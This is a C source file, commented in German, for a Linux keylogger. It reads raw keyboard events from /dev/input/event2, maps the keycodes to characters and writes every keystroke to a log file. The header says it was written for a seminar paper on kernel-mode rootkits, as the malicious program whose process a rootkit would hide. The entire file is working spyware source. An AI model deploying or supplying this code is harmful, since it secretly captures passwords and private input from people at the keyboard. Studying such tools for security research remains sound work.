// Ein Keylogger, welche Tastatureingaben des Benutzers mitließt und in eine Datei speichert.
// Die Datei "logFile.text" muss beim Programmaufruf als Parameter in der Konsole mitgegeben werden!
// Der Keylogger diente als Schadprogramm, wovon die PID mithilfe des Rootkits verborgen werden sollte 
// Dieses Programm wurde für die Seminararbeit "Kernel-Mode-Rootkits und Hooking-Methoden" entwickelt
// @author Michael Küchenmeister
// @version 06/2020

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <fcntl.h>

// Das ist die Tastatur
#define TASTATUR "/dev/input/event2"

// Das sind die Ausgaben zu den jeweiligen Keycodes
static const char *keycodes[] = {
  " (RESERVED)", " (ESC)", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
  "-", "=", " (BACKSPACE)", " (TAB)", "q", "w", "e", "r", "t", "z", "u", "i",
  "o", "p", "ü", "]", " (ENTER)", " (STRG)", "a", "s", "d", "f", "g", "h",
  "j", "k", "l", "ö", "ä", "`", " (L_SHIFT)", "\\", "y", "x", "c", "v", "b",
  "n", "m", ",", ".", "/", " (R_SHIFT)", "*", " (L_ALT)", " (SPACE)", " (CAPS_LOCK)", 
  " (F1)", " (F2)", " (F3)", " (F4)", " (F5)", " (F6)", " (F7)", " (F8)", " (F9)", " (F10)", " (NUM_LOCK)",
  " (SCROLL_LOCK)", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", 
  ",", "?", "?", "?", "?", " (F11)", " (F12)", "?", "?", "?", "?", "?", "?", "?", 
  " (ENTER)", " (STRG)", "/", "?", " (ALT)", "?", " (HOME)", " (UP)", " (PAGE_UP)", " (LEFT)", 
  " (RIGHT)", " (ENDE)", " (DOWN)", " (PAGE_DOWN)", " (EINFÜGEN)", " (ENTF)", "?", "?", "?", 
  "?", "?", "?", "?", " (PAUSE)"
};

static int leseEingaben = 0;
static int keyboard_fd = 0;
static char *ausgabeDatei = NULL;

void keylogger_init(char *dateiName) {
  leseEingaben = 1;
  ausgabeDatei = dateiName;
  
  // Belegen des file descriptors mit unserer Tastatrur und der Berechtigung Read-Only
  if ((keyboard_fd = open(TASTATUR, O_RDONLY)) < 0) {
    fprintf(stderr, "Von der Tastatur konnte nicht gelesen werden!\n");
    exit(EXIT_FAILURE);
  } 
}

void keylogger_exit(void) {
  close(keyboard_fd);
}

void keylogger_run(void) {
  // Belegen eines File Pointers, um in unsere Datei schreiben zu können
  FILE *file = NULL;
  // Mithilfe dieser Struktur können die Tastatureingaben ausgelesen werden, siehe /usr/include/linux/input-event-codes.h
  struct input_event event;
  // Öffnen des Files zum mitscheiben der Tasteneingaben
  file = fopen(ausgabeDatei, "w");
  while (leseEingaben) {
    // read-Funktion, um aus einem file descriptor zu lesen
    read(keyboard_fd, &event, sizeof(event));
    // Wenn eine Taste gedrückt wurde
    if (event.type == EV_KEY && event.value == 1) {
      if(event.code == 107) {
        // Ende-Code, beendet den Keylogger
        leseEingaben = 0;
      } else if(event.code == 28) {
        // Zeilenumbruch
        fprintf(file, "\n");
      } else if(event.code == 57) {
        // Leertaste
        fprintf(file, " ");
      } else {
        // Alle anderen Tasten
        fprintf(file, "%s", keycodes[event.code]);
        fflush(file); // Leert den Eingabepuffer
      }
    }
  }
  fclose(file);
}

int main(int argc, char *argv[]) {
  keylogger_init(argv[1]);
  keylogger_run();
  keylogger_exit();
  return 0;
}
